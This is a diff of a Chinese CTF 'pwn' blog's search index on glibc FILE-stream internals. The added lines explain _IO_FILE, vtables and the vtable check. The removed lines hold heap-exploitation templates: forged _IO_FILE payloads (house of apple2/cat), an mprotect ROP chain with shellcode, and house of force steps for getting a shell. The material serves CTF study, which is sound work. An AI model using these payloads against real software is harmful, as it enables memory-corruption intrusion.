-fake_IO_FILE = fake_IO_FILE.ljust(0xd8, &#39;\x00&#39;)
-fake_IO_FILE += p64(libcbase+0x2160c0+0x10)  # vtable=IO_wfile_jumps+0x10
-fake_IO_FILE +=p64(0)*6
-fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr
-</code></pre>
-<p>其中fake_io_addr为我们伪造IO_FILE结构体的地址。<br>vtable函数，如果打FSOP则改成IO_wifle_jumps+0x30.<br>rdi、rdx为我们调用函数的参数。  </p>
+    <title>IO</title>
+    <url>/2024/07/18/IO/</url>
+    <content><![CDATA[<hr>
+<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1><p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>和<a href="https://ray-cp.github.io/">ray-cp</a> 或者星盟的也可以      </p>
+<br>
 <br>
 
-<p>例子orw：  </p>
-<pre><code>Fake_IO_File_Structure = IO_FILE_plus_struct(fake_io_addr)
-Fake_IO_File_Structure._IO_save_base = p64(1)                                           # RCX
-Fake_IO_File_Structure._IO_backup_base = p64(fake_io_addr + 0x120 - 0xa0)               # mov    rdx, qword ptr [rax + 0x20]
-Fake_IO_File_Structure._IO_save_end = p64(setcontext)                                   # call   qword ptr [rax + 0x18]
-Fake_IO_File_Structure._wide_data = p64(fake_io_addr + 0x30)                            # mov    rax, qword ptr [rdi + 0xa0]
-Fake_IO_File_Structure._offset = 0
-Fake_IO_File_Structure._vtable_offset = 0
-Fake_IO_File_Structure._mode = 1
-Fake_IO_File_Structure.vtable = p64(libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;] + 0x30)
+<h2 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h2><p><em>引入原因： </em><br>对于LBA硬盘来说，读写数据都必须一块一块的读，如果我们每次执行read，write时都是操作很少的数据，则对系统消耗非常大，因此，C库就想了一个好办法——缓冲区。   </p>
+<pre><code>1、输入缓冲区   
+从外部硬件读取时。为了减少消耗，会一次从外部硬件读取一“块”数据，并放入缓冲区，然后当target需要时，再从头部慢慢读取，只到读完才再次从硬件读取。这个缓冲区叫输入缓冲区。      
 
-Fake_IO_File_Structure = bytes(Fake_IO_File_Structure)
-Fake_IO_File_Structure += p64(0) * 6
-Fake_IO_File_Structure += p64(fake_io_addr + 0x40)                                      # mov    rax, qword ptr [rax + 0xe0]
-Fake_IO_File_Structure = Fake_IO_File_Structure.ljust(0x120, b&#39;\x00&#39;) + p64(fake_io_addr + 0x128) + p64(ret)
-rop = p64(rdi) + p64((fake_io_addr &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x1000) + p64(rdx_r12) + p64(7) * 2 + p64(mprotect) + p64(fake_io_addr + 0x178) + asm(shellcraft.cat(&#39;/flag&#39;))
+对于输入缓冲区ptr-end是有用的数据，base-ptr为已使用的数据。
 
-Fake_IO_File_Structure += rop
+
+2、输出缓冲区  
+向外部硬件写入时。为了减少消耗，不会一有东西就写入，而是先将内容从source写入缓冲区，当缓冲区满了时候再将内存一起写入硬件。这个缓冲区叫输出缓冲区。
+
+对于输出缓冲区base-ptr是要写入硬件的内容（有用数据），ptr-end为空闲区域。  
+</code></pre>
+<h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="IO_FILE_plus"></a>IO_FILE_plus</h2><pre><code>    struct _IO_FILE_plus
+    &#123;
+    _IO_FILE file;
+    const struct _IO_jump_t *vtable;
+    &#125;;
+    IO_FILE(结构体）
+    - struct _IO_FILE &#123;
+    int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
+    #define _IO_file_flags _flags
+
+char_IO_read_ptr;   /* Current read pointer */ 
+char_IO_read_end;   /* End of get area. */
+char_IO_read_base;  /* Start of putback+get area. */
+- //read ptr是现在read指针指向的位置，end则是read读取结束的位置，base则是开始的位置
+- 
+
+char_IO_write_base; /* Start of put area. */
+char_IO_write_ptr;  /* Current put pointer. */
+char_IO_write_end;  /* End of put area. */
+//write的指针的作用是与read指针的作用是一致的
+
+char_IO_buf_base;   /* Start of reserve area. */
+char_IO_buf_end;    /* End of reserve area. */
+//缓冲区的位置
+
+
+/* The following fields are used to support backing up and undo. */
+char *_IO_save_base; /* Pointer to start of non-current get area. */
+char *_IO_backup_base;  /* Pointer to first valid character of backup area */
+char *_IO_save_end; /* Pointer to end of non-current get area. */
+
+struct _IO_marker *_markers;
+
+struct _IO_FILE *_chain;
+//chain依次链接的是stdin、stdout、stderr
+
+int _fileno;
+//一般指的是目前是在哪个chain里，0是in，1是out，2是err
+
+#if 0
+int _blksize;
+#else
+int _flags2;
+#endif
+_IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */
+
+#define __HAVE_COLUMN /* temporary */
+/* 1+column number of pbase(); 0 is unknown. */
+unsigned short _cur_column;
+signed char _vtable_offset;
+char _shortbuf[1];
+
+/*  char* _save_gptr;  char* _save_egptr; */
+
+_IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+&#125;;
 </code></pre>
 <br>
+<br>
+
+<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><pre><code>struct _IO_jump_t
+&#123;
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    /* showmany */
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+#if 0
+    get_column;
+    set_column;
+#endif
+&#125;;
+</code></pre>
+<br>
+<br>
+
+<h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="IO_str_jumps"></a>IO_str_jumps</h2><pre><code>1. // libio/strops.c
+2. 
+3. const struct _IO_jump_t _IO_str_jumps libio_vtable =
+4. &#123;
+5.   JUMP_INIT_DUMMY,
+6.   JUMP_INIT(finish, _IO_str_finish),
+7.   JUMP_INIT(overflow, _IO_str_overflow),
+8.   JUMP_INIT(underflow, _IO_str_underflow),
+9.   JUMP_INIT(uflow, _IO_default_uflow),
+10.   JUMP_INIT(pbackfail, _IO_str_pbackfail),
+11.   JUMP_INIT(xsputn, _IO_default_xsputn),
+12.   JUMP_INIT(xsgetn, _IO_default_xsgetn),
+13.   JUMP_INIT(seekoff, _IO_str_seekoff),
+14.   JUMP_INIT(seekpos, _IO_default_seekpos),
+15.   JUMP_INIT(setbuf, _IO_default_setbuf),
+16.   JUMP_INIT(sync, _IO_default_sync),
+17.   JUMP_INIT(doallocate, _IO_default_doallocate),
+18.   JUMP_INIT(read, _IO_default_read),
+19.   JUMP_INIT(write, _IO_default_write),
+20.   JUMP_INIT(seek, _IO_default_seek),
+21.   JUMP_INIT(close, _IO_default_close),
+22.   JUMP_INIT(stat, _IO_default_stat),
+23.   JUMP_INIT(showmanyc, _IO_default_showmanyc),
+24.   JUMP_INIT(imbue, _IO_default_imbue)
+25. &#125;;
+</code></pre>
+<br>
+<br>                                                                               
+                                                                                             
+
+
+<h2 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="IO_file_jumps"></a>IO_file_jumps</h2><pre><code>&#123;
+__dummy = 0,
+__dummy2 = 0,
+__finish = 0x7ffff7c91a30 &lt;_IO_new_file_finish&gt;,
+__overflow = 0x7ffff7c92de0 &lt;_IO_new_file_overflow&gt;,
+__underflow = 0x7ffff7c92630 &lt;_IO_new_file_underflow&gt;,
+__uflow = 0x7ffff7c95590 &lt;__GI__IO_default_uflow&gt;,
+__pbackfail = 0x7ffff7c96dd0 &lt;__GI__IO_default_pbackfail&gt;,
+__xsputn = 0x7ffff7c939d0 &lt;_IO_new_file_xsputn&gt;,
+__xsgetn = 0x7ffff7c93d10 &lt;__GI__IO_file_xsgetn&gt;,
+__seekoff = 0x7ffff7c93150 &lt;_IO_new_file_seekoff&gt;,
+__seekpos = 0x7ffff7c95cb0 &lt;_IO_default_seekpos&gt;,
+__setbuf = 0x7ffff7c923f0 &lt;_IO_new_file_setbuf&gt;,
+__sync = 0x7ffff7c93000 &lt;_IO_new_file_sync&gt;,
+__doallocate = 0x7ffff7c85110 &lt;__GI__IO_file_doallocate&gt;,
+__read = 0x7ffff7c938a0 &lt;__GI__IO_file_read&gt;,
+__write = 0x7ffff7c93930 &lt;_IO_new_file_write&gt;,
+__seek = 0x7ffff7c938c0 &lt;__GI__IO_file_seek&gt;,
+__close = 0x7ffff7c93920 &lt;__GI__IO_file_close&gt;,
+__stat = 0x7ffff7c938d0 &lt;__GI__IO_file_stat&gt;,
+__showmanyc = 0x7ffff7c96f80 &lt;_IO_default_showmanyc&gt;,
+__imbue = 0x7ffff7c96f90 &lt;_IO_default_imbue&gt;
+&#125;
+</code></pre>
+  <br>
+
+<h3 id="glibc2-24增加的vtable-check"><a href="#glibc2-24增加的vtable-check" class="headerlink" title="glibc2.24增加的vtable_check"></a>glibc2.24增加的vtable_check</h3><pre><code>2.23 的没有任何限制，可以将vtable 劫持在堆上并修改其内容，然后触发FSOP.   
+
+2.24 引入了vtable check，使得将vtable 整体劫持到堆上已不可能，大佬发现可以使用内部的vtable中_IO_str_jumps或_IO_wstr_jumps来进行利用。   
+
+2.31 中将_IO_str_finish函数中强制执行free函数，导致无法使用上述问题，因而催生出其他调用链。
+
+
+void _IO_vtable_check (void) attribute_hidden;
+static inline const struct _IO_jump_t *
+IO_validate_vtable (const struct _IO_jump_t *vtable)
+&#123;
+uintptr_t section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;
+uintptr_t ptr = (uintptr_t) vtable;
+uintptr_t offset = ptr -(uintptr_t)__start___libc_IO_vtables;
+if (__glibc_unlikely (offset &gt;= section_length))
+    _IO_vtable_check ();
+return vtable;
+&#125;     
+</code></pre>
+<h4 id="虚表范围-glibc2-37之前"><a href="#虚表范围-glibc2-37之前" class="headerlink" title="虚表范围-glibc2.37之前"></a>虚表范围-glibc2.37之前</h4><p>虚表位置判断主要在IO_validate_vtable函数，2.37以前判断区间为_IO_helper_jumps - _IO_str_jumps之间的区域 0xd60，里面有以下虚表。</p>
+<pre><code>_IO_helper_jumps
+_IO_helper_jumps
+_IO_cookie_jumps
+_IO_proc_jumps
+_IO_str_chk_jumps
+_IO_wstrn_jumps
+_IO_wstr_jumps
+_IO_wfile_jumps_maybe_mmap
+_IO_wfile_jumps_mmap
+__GI__IO_wfile_jumps
+_IO_wmem_jumps
+_IO_mem_jumps
+_IO_strn_jumps
+_IO_obstack_jumps
+_IO_file_jumps_maybe_mmap
+_IO_file_jumps_mmap
+__GI__IO_file_jumps
+_IO_str_jumps
+</code></pre>
+<p>之后居然还有虚表check绕过<br>详情：<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3</a></p>
 <br> 
+    几个常用的函数：  
+  
+<pre><code>    1、_IO_new_file_overflow   
+    这个函数意图比较简单，主要是处理当输出缓冲区用完时，向硬盘写入数据。当然，其实这个函数内部非常复杂，加入了一些检测。  
 
-<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><em>条件</em><br>1、glibc：2.23-2.29<br>2、malloc size无限制，或size可以很大<br>3、至少可以溢出8字节</p>
-<p><em>利用流程：</em></p>
-<pre><code>修改topchunk_size为0xffffffffffffffff
-计算target_size=target_addrtopchunk_addr-0x30
-malloc一个chunk
-getshell
- 
- 
+    2、_IO_new_file_unflow      
+    这个函数与_IO_new_file_overflow差不多，主要是用于从硬盘中读取数据，每次读取都是_IO_buf_base 至 _IO_buf_end。为了防止硬盘中没有这么多数据，设置_IO_read_end为读取的总数。  
+
+    3、__GI__IO_file_read（_IO_file_read）
+    这个是输入的最终函数，它将syscall_read进行了一定的封装。
+
+    4、_IO_new_file_write 
+    这个是输出的最终函数，它将syscall_write进行了一定的封装。
+
+    5、IO_default_seekpos
+    就是调用_IO_new_file_seekoff。
+
+    6、_IO_new_file_seekoff
+    设置偏移函数，就是设置我们所说的ptr指针。
+
+    7、__GI__IO_file_xsgetn（_IO_file_xsgetn）
+    这个函数是主要目的是将数据从输入缓冲区放入target。
+    说明：我们平时的输入函数主要就是调用此函数。
+
+    8、_IO_new_file_xsputn
+    这个函数是主要目的是将数据从source放入输出输出缓冲区。
+    说明：我们平时的输出函数主要就是调用此函数。
 </code></pre>
-<br>
- 
-<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><p>个人感觉这个house of apple与house of cat不同必须要泄露heap地址，毕竟apple需要两个伪造的地址来控制eip，除非你知道栈地址。<br>具体原理请看:<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a>       </p>
-<br>
-<em>适用版本</em>    
-glibc:2.34-         
-
-<br>
-<em>条件</em>                               
-
-<p>1、能控制_IO_FILE的vtable和_wide_data，或者可以largebinattack<br>2、可以泄露heap和libc地址<br>3、可以执行IO流，exit、malloc assert、返回main函数…….  </p>
-<br>
-<br>
-
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在_IO_2_1_stderr&#x2F;stdout&#x2F;stdin_中，vatable函数在glibc2.24之后，增加了范围检查。<br>但是在_IO_wide_date这个结构体成员变量中，存在一个_wide_vtable成员变量，这个功能与vatble一致,但是与file结构体中的vtable不同的是，在这个_wide_vtable中是没有范围检查的直接调用宏了。<br><br></p>
-<p><em>所以根据上述描述可以将</em><br>    _IO_wide_date覆盖成我们的可控heap地址<br>    vtable覆盖成_IO_wfile_jmups<br>    _wide_vtable劫持为我们的rip        </p>
-<h3 id="共有三种v劫持IO流的方式"><a href="#共有三种v劫持IO流的方式" class="headerlink" title="共有三种v劫持IO流的方式"></a>共有三种v劫持IO流的方式</h3><pre><code>_IO_wfile_overflow
-_IO_wfile_underflow_mmap
-_IO_wdefault_xsgetn
-</code></pre>
-<br>
-
-<h3 id="1、-利用-IO-wfile-overflow"><a href="#1、-利用-IO-wfile-overflow" class="headerlink" title="1、 利用_IO_wfile_overflow"></a>1、 利用_IO_wfile_overflow</h3><p><em>调用链</em>     </p>
-<pre><code>_IO_wfile_overflow
-    _IO_wdoallocbuf
-        _IO_WDOALLOCATE
-            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)
-</code></pre>
-<br>
-<em>伪造file及_IO_wide_date_</em>
-
-<pre><code>_flags设置为~(2 | 0x8 | 0x800)，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有两个空格
-vtable设置为_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap地址（加减偏移），使其能成功调用_IO_wfile_overflow即可
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_write_base设置为0，即满足*(A + 0x18) = 0
-_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-</code></pre>
-<p><em>条件绕过</em>        </p>
-<pre><code>需要满足f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0
-需要满足fp-&gt;_wide_data-&gt;_IO_buf_base != 0和fp-&gt;_flags &amp; _IO_UNBUFFERED == 0。
-</code></pre>
-<br>
-    模板（getshell）
-<em>需要将伪造chunk的pre_size位伪造成  '  sh;'  或者  ';sh\x00'  </em>    
-
-
-<pre><code>    fake_io_file = p64(0)*2 + p64(1) + p64(2)
-    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b&#39;\0&#39;) + p64(chunk_addr+0x100) # _wide_data
-    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b&#39;\0&#39;) + p64(0xffffffffffffffff) # _mode
-    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b&#39;\0&#39;) + p64(io_wfile_jumps) # vtable
-    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b&#39;\0&#39;) + p64(chunk_addr+0x200)
-    fake_io_file = fake_io_file.ljust(0x200-0x10,b&#39;\0&#39;)+p64(0)*13+ p64(sys)
-    
-</code></pre>
-<br>
-<br>
-
-<h3 id="2、利用IO-wfile-underflow-mmap"><a href="#2、利用IO-wfile-underflow-mmap" class="headerlink" title="2、利用IO_wfile_underflow_mmap"></a>2、利用IO_wfile_underflow_mmap</h3><p><em>调用链</em><br>    _IO_wfile_underflow_mmap<br>        _IO_wdoallocbuf<br>            _IO_WDOALLOCATE<br>                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)          </p>
-<br>
-<em>伪造</em>   
-
-<pre><code>_flags设置为~4，如果不需要控制rdi，设置为0即可；如果需要获得shell，可设置为 sh;，注意前面有个空格
-vtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可
-_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)
-_wide_data-&gt;_IO_buf_base设置为0，即满足*(A + 0x30) = 0
-_wide_data-&gt;_IO_save_base设置为0或者合法的可被free的地址，即满足*(A + 0x40) = 0
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持RIP，即满足*(B + 0x68) = C
-</code></pre>
-<br>
-<em>条件绕过</em>       
-
-<pre><code>需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base == NULL和fp-&gt;_wide_data-&gt;_IO_save_base == NULL。        
-</code></pre>
-<br>
-
-<h3 id="3、利用-IO-wdefault-xsgetn"><a href="#3、利用-IO-wdefault-xsgetn" class="headerlink" title="3、利用_IO_wdefault_xsgetn"></a>3、利用_IO_wdefault_xsgetn</h3><p><em>调用链</em>    </p>
-<pre><code>_IO_wdefault_xsgetn
-    __wunderflow
-        _IO_switch_to_wget_mode
-            _IO_WOVERFLOW
-                *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x18)(fp)
-</code></pre>
-<br>
-<em>伪造</em>       
-
-<pre><code>_flags设置为0x800
-vtable设置为_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps地址（加减偏移），使其能成功调用_IO_wdefault_xsgetn即可
-_mode设置为大于0，即满足*(fp + 0xc0) &gt; 0
-_wide_data设置为可控堆地址A，即满足*(fp + 0xa0) = A
-_wide_data-&gt;_IO_read_end == _wide_data-&gt;_IO_read_ptr设置为0，即满足*(A + 8) = *A
-_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt; *(A + 0x18)
-_wide_data-&gt;_wide_vtable设置为可控堆地址B，即满足*(A + 0xe0) = B
-_wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满足*(B + 0x18) = C
-</code></pre>
-<br>
-
-<p><em>条件绕过</em>   </p>
-<pre><code>直接设置fp-&gt;_wide_data-&gt;_IO_read_ptr == fp-&gt;_wide_data-&gt;_IO_read_end，使得count为0，不进入if分支。
-随后当more != 0时会进入__wunderflow。   
-要想调用到_IO_switch_to_wget_mode，需要设置fp-&gt;mode &gt; 0，并且fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0。
-当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。
-</code></pre>
-<br>
-<br>
-
 <hr>
 ]]></content>
       <tags>
         <tag>pwn</tag>
         <tag>IO</tag>
-        <tag>house of</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
